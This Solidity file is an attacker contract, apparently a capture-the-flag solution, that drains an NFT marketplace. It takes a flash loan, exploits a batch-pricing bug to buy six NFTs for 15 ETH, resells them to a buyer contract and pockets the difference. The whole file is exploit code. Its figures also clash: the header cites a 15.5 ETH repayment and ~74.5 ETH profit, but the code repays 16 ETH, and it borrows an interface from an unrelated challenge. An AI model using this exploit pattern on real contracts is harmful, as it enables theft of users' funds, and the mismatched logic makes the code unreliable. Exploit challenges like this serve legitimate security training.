// SPDX-License-Identifier: MIT
// FREE-RIDER DRAIN (flash-loan + batch overcredit class).
// Technique: flash-borrow 15 ETH, buy all 6 NFTs for 15 ETH total while the
// marketplace overpays its sellers, resell each NFT to the waiting buyer for
// 15 ETH apiece, repay the 15.5 ETH loan, and keep the ~74.5 ETH profit.
pragma solidity ^0.8.0;

import {IFreeRiderPool} from "../interfaces/IFreeRiderPool.sol";
import {IFlashLoanReceiver} from "../challenges/NaiveReceiverPool.sol";
import {INaiveReceiverPool} from "../interfaces/INaiveReceiverPool.sol";
import {ERC721} from "../tokens/ERC721.sol";
import {FreeRiderBuyer} from "../challenges/FreeRiderBuyer.sol";

contract FreeRiderAttacker is IFlashLoanReceiver {
    INaiveReceiverPool public immutable lenderPool;
    IFreeRiderPool public immutable marketplace;
    ERC721 public immutable nft;
    FreeRiderBuyer public immutable buyer;
    address public immutable owner;

    uint256 internal constant NFT_PRICE = 15 ether;
    // 15 loan + 1 pool fee (the lender pool charges a fixed 1 ETH per loan).
    uint256 internal constant LOAN_REPAY = 16 ether;

    uint256[] private tokenIds;
    bool private repaid;

    constructor(
        address _lenderPool,
        address _marketplace,
        address _nft,
        address _buyer,
        uint256[] memory _tokenIds
    ) {
        lenderPool = INaiveReceiverPool(_lenderPool);
        marketplace = IFreeRiderPool(_marketplace);
        nft = ERC721(_nft);
        buyer = FreeRiderBuyer(payable(_buyer));
        owner = msg.sender;
        tokenIds = _tokenIds;
    }

    function attack() external {
        // 15 ETH covers 6 NFTs thanks to the batch-pricing bug.
        lenderPool.flashLoan(address(this), NFT_PRICE);

        // Everything left is profit.
        payable(owner).transfer(address(this).balance);
    }    // Flash-loan callback: the loan arrives as msg.value. Buy the whole
    // batch, then resell every NFT to the waiting buyer at full price.
    function receiveEther(uint256) external payable override {
        marketplace.buyMany{value: msg.value}(tokenIds);

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.approve(address(buyer), tokenIds[i]);
            buyer.buy(address(nft), tokenIds[i]);
        }

        if (!repaid && address(this).balance >= LOAN_REPAY) {
            repaid = true;
            lenderPool.deposit{value: LOAN_REPAY}();
        }
    }

    receive() external payable {}
}
